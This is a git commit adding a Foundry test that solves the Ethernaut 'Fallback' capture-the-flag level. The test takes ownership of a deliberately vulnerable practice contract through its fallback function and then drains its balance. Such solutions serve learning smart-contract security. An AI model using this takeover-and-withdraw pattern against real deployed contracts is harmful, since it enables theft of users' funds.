20059dec1f11e6ab0c9bc716bbea7896e2dc1c65
Andrew Hopkins <ahopkins0929@gmail.com>
2023-02-02 19:56:53 -0500

    fallback solution

--- test/Fallback.t.sol
+++ test/Fallback.t.sol
@@ -27,9 +27,20 @@ contract FallbackTest is DSTest {
         address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
         Fallback ethernautFallback = Fallback(payable(levelAddress));
 
-        /*
-        Attack here
-        */
+        // START
+        // contribute less than 0.001 ether
+        ethernautFallback.contribute{value: 0.0005 ether}();
+        assertEq(ethernautFallback.getContribution(), 0.0005 ether);
+
+        // call fallback function
+        (bool success,) = payable(ethernautFallback).call{value: 1 wei}("");
+        assert(success);
+        assertEq(ethernautFallback.owner(), eoaAddress);
+
+        // drain the balance
+        ethernautFallback.withdraw();
+        assertEq(address(ethernautFallback).balance, 0);
+        // END
 
         bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
